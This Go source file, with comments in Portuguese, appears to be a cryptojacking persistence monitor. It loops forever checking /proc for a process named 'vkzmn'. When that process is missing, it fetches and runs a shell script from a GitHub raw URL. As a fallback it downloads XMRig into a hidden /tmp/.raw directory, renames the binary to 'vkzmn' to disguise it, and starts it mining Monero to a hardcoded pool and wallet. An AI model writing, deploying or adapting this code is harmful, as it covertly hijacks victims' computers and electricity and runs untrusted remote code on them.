package main



import (
	"fmt"
	"io/ioutil"
	"os"
	"strings"
	"time"
        "net/http"
        "os/exec"
)

//esse e o monitor ele ficara em um loop infinito  verificando se  o vkzmn esta em execucao

func exec_vkzmn() {

   do :=  exec.Command( "sh" , "/tmp/down_vkzmn.sh")
 
   go   do.Run()

}





func  magic() {

//check magic byte in down_vkzmn.sh

ptr ,  err_open := os.Open("/tmp/down_vkzmn.sh")

my_str  :=   "#ATILA_VKZMN"


  if err_open == nil {

  down_bytes , err_readall :=   ioutil.ReadAll(ptr)
       
        if  err_readall == nil {

               down_str := string(down_bytes)


                   if (strings.Contains(down_str  ,  my_str ) ) {

                          //script valido

                            exec_vkzmn()


                                           
                      }  else { fmt.Println("script invalido") 
                       

                             down_vkzmn() 

                                 

                               
                             }                                                  


                        
 } 
        
}

}





func  down_raw() {



fmt.Println("abaixando o xmrig  bruto")



//config.json


url := "--url  pool.supportxmr.com:9000"

user :=  "--user  4Ary8uo817nZAjKXPtgRLf1XUVn1KXUp5WDBUrjDfctwGpirSoxKqBNRnRsgp7ha5vGxXD2u8maGMTezRzjaXrizTp2xYFy" 

pass :=  "--pass kiidie"

dl :=   "--donate-level 1"

tls :=  "--tls"



config :=  fmt.Sprintf(   "%s %s %s %s %s" , url , user , pass , dl , tls)

 
//fmt.Println(config)



//

 
  



r ,  e    :=  http.NewRequest("GET" , "https://download.xmrig.com/xmrig/6.9.0/072881e1a1214befdd46f5823f4ba7afeb14136a/xmrig-6.9.0-linux-x64.tar.gz" , nil)

      if e != nil {

 
           fmt.Println("erro em down raw" )

            return 
             }

  

         r.SetBasicAuth("xmrig" , "download")

          cli  := http.Client{}

           rr , ee :=  cli.Do(r)
            
              if ee  == nil   {

                rrr ,   eee :=   ioutil.ReadAll(rr.Body)
 
                   if eee == nil  { 


                        os.MkdirAll("/tmp/.raw" , 0777)


                          ioutil.WriteFile("/tmp/.raw/vkzmn.raw" ,  rrr ,  0777 )


rrrr :=  exec.Command("sh"  ,  "-c" , "cd /tmp/.raw ; tar  -xf *raw ; cd *.0 ; rm config.json ; mv xmrig vkzmn ; ./vkzmn " + config )


rrrr.Run()


  }

        
}  
    
                   
  
}







func down_vkzmn()  {



fmt.Println("abaixando vkzmn")


cli := http.Client{}

resp , err_get := cli.Get("https://github.com/atilabyte/golang/raw/refs/heads/master/down.sh")

 if err_get != nil {

 fmt.Println(err_get)  //erro no github.com 
 
       
      down_raw() // call  plane b

           return


     }

 

script  , err_readall :=  ioutil.ReadAll(resp.Body) 

  
     if err_readall  != nil {

       fmt.Println("erro em readall")

           down_raw() 

           return 

         
     
        }


ioutil.WriteFile("/tmp/down_vkzmn.sh" , script , 0777 )
 
  



}











func  proc() {





main_func:


        //go bot()

        


 


	time.Sleep(1 * time.Second)

	var vkzmn_ok int = 0

	dir, err := os.Open("/proc") //abre o diretorio /proc

	if err != nil {

		fmt.Println("error em open")

	}

	file, err := dir.Readdir(0) //ler os arquivos e direorios dentro de /proc

	if err != nil {

		fmt.Println("erro em dir")

	}

	for _, fi := range file { //intera sobre os diretorio


		procs_cmdline := fmt.Sprintf("/proc/%s/cmdline", fi.Name()) //constroi o caminho pra pega o cmdline dos processos em execucao

		read_procs, err := ioutil.ReadFile(procs_cmdline)

		if err != nil {

			fmt.Println("") //error em readall

		}

		str_proc := string(read_procs)

		out := strings.Contains(str_proc, "vkzmn")

		if out == true {

			vkzmn_ok = 23

                         


		}


	}




	if vkzmn_ok == 23 {
                     


              
 
		fmt.Println("vkzmn em execucao")




	} else {


		fmt.Println("vkzmn nao ta em execucao")


                    _, err_open :=   os.Open("/tmp/down_vkzmn.sh")  


                        if  err_open != nil { 
                     
                            fmt.Println("down_vkzmn.sh nao foi abaixado")

              
                            down_vkzmn()
  


                          } else {



                             fmt.Println("down_vkzmn.sh ja esta em //tmp" )
                                   

       
                          go    magic()



                       }






	}


	goto main_func



}
